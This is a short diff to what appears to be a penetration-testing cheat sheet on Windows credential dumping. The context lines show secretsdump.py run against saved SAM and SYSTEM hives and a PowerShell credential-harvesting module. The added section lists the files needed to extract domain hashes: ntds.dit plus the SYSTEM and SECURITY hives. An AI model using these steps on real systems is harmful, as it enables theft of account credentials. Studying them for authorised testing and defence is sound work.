@@ -77,3 +77,9 @@ secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
       Import-Module C:\Tools\Get-WebCredentials.ps1
       Get-WebCredentials
       ```
+# 7-NTDS:
+  - **Local**:
+    - we need the following files:
+        - C:\Windows\NTDS\ntds.dit
+        - C:\Windows\System32\config\SYSTEM
+        - C:\Windows\System32\config\SECURITY
